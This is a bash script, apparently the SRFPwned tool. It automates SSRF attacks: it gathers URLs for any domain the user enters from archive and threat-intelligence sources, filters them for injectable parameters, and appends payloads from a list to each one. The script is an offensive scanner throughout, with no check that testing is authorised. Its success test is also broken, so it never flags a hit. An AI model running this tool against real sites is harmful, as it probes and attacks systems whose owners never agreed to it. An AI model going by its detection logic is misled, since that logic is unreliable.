#!/bin/bash

echo "Installing Dependencies..."
sleep 1
# Check for and install waybackurls
if ! command -v waybackurls &> /dev/null
then
    echo "waybackurls could not be found. Installing..."
    go install -v github.com/tomnomnom/waybackurls@latest
else
    echo "waybackurls is already installed."
fi

# Check for and install httpx
if ! command -v httpx &> /dev/null
then
    echo "httpx could not be found. Installing..."
    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
else
    echo "httpx is already installed."
fi

# Check for and install gf
if ! command -v gf &> /dev/null
then
    echo "gf could not be found. Installing..."
    go install -v github.com/tomnomnom/gf@latest
else
    echo "gf is already installed."
fi

# Copy gf patterns to proper directory
if [ ! -d "$HOME/.gf" ]
then
    mkdir "$HOME/.gf"
fi
cp -r $GOPATH/pkg/mod/github.com/tomnomnom/gf@*/examples ~/.gf

# Check for and install lolcat
if ! command -v lolcat &> /dev/null
then
    echo "lolcat could not be found. Installing..."
    sudo pip install lolcat
else
    echo "lolcat is already installed."
fi

# Move gf to /usr/local/bin
sudo cp $GOPATH/bin/* /usr/local/bin/
clear
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security
# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}

# Print the quote
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small SRFPwned | lolcat
echo ""
echo "[YOUR ARE USING SRFPwned.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
# Prompt user for domain to test
echo -n "Enter target domain: "
read domain

# Create output directory
output_dir="$domain-$(date +%Y%m%d%H%M%S)"
mkdir "$output_dir"

# Fetch URLs from domain using waybackurls
echo "Fetching URLs using Waybackmachine..."
waybackurls $domain > "$output_dir/waybackurls.txt"
total=$(wc -l < "$output_dir/waybackurls.txt")
echo "Found $total URLs from Waybackmachine"
sleep 2

# Fetch URLs from domain using AlienVault
echo "Fetching URLs using AlienVault..."
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq -r '.passive_dns[].hostname' | sed 's/\*\.//g' | sort -u > "$output_dir/alien_urls.txt"
total=$(wc -l < "$output_dir/alien_urls.txt")
echo "Found $total URLs from AlientVault"
sleep 2
# Fetch URLs from domain using URLScan
echo "Fetching URLs using URLScan..."
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq -r '.results[].page.url' | sort -u > "$output_dir/urlscan_urls.txt"
total=$(wc -l < "$output_dir/urlscan_urls.txt")
echo "Found $total URLs from URLScan"
sleep 2

echo "Combining all URLs and Filtering out all Irrelevant extensions while cleaning all Parameters..."
# Combine the two URL lists and filter out irrelevant extensions
cat "$output_dir/waybackurls.txt" "$output_dir/alien_urls.txt" "$output_dir/urlscan_urls.txt" | grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js)$' | sort -u > "$output_dir/all_urls.txt"
sleep 1
# Test URLs for SSRF
echo "Extracting Alive URls, Filter them with GF for SSRF..."
cat "$output_dir/all_urls.txt" | httpx --verbose | sed 's/=.*/=/' | gf ssrf > "$output_dir/final_urls.txt"
total=$(wc -l < "$output_dir/final_urls.txt")
echo "Found $total URLs ideal for SSRF"
sleep 5

# Read payloads from directory - modify it to add more after the cp command
echo "Using Internal Payloads..."
cp ssrfpayloads.txt "$output_dir/"
cat "$output_dir/ssrfpayloads.txt" > "$output_dir/merged_payloads.txt"

# Test URLs for SSRF
echo "Testing URLs for SSRF vulnerabilities..."

# Loop through each URL and test for SSRF
while read url; do
  # Extract base URL and parameters from URL
  base_url=$(echo "$url" | awk -F'[?]' '{print $1}')
  params=$(echo "$url" | awk -F'[?]' '{print $2}')

  # Loop through each payload and test for SSRF
  while read payload; do
    # Inject payload into each parameter and test URL
    full_url="$url$payload"
    echo -ne "[*] Testing $full_url -->"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")

    if [[ $response == 200 && $(curl -s "$full_url" | grep -q "$payload") ]]; then
      echo -e "\033[0;32mVulnerable\033[0m"
      echo "$full_url" >> "$output_dir/vulnerable.txt"
    else
      echo -e "\033[0;31mNot vulnerable\033[0m"
    fi

    # Sleep for 1 second before testing the next payload
    sleep 1
  done < "$output_dir/merged_payloads.txt"

  # Sleep for 5 seconds before testing the next URL
  sleep 1
done < "$output_dir/final_urls.txt"

# Count the number of vulnerable URLs found and print the total
total_vulnerable=$(wc -l < "$output_dir/vulnerable.txt")
echo "Found $total_vulnerable vulnerable URLs."
